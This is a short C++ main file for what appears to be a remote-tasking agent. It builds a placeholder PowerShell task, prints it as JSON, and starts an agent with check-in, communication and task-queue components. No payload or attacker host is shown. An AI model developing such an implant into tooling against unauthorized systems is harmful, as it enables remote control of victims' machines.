//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
#include "Agent.h"
#include "CommManager.h"
#include "CheckinModels.h"
#include "TaskQueueManager.h"
#include "Task.h"
#include "Command.h"

template<class... Ts> struct overloaded : Ts... { using Ts::operator()...; };
template<class... Ts> overloaded(Ts...) -> overloaded<Ts...>;

int main(int argc, char *argv[])
{
    TaskRequest<CommandPowershell> testTask = { 1, POWERSHELL, 1, 1, CommandPowershell {"hello", "test"}};
    auto output = testTask.StructToJson();
    std::cout << output << std::endl;

    CommManager commManager = {};
    TaskQueueManager taskManager = {};

    Agent agent = { commManager, taskManager };
    agent.Start();
    return 0;
}

//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { END OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
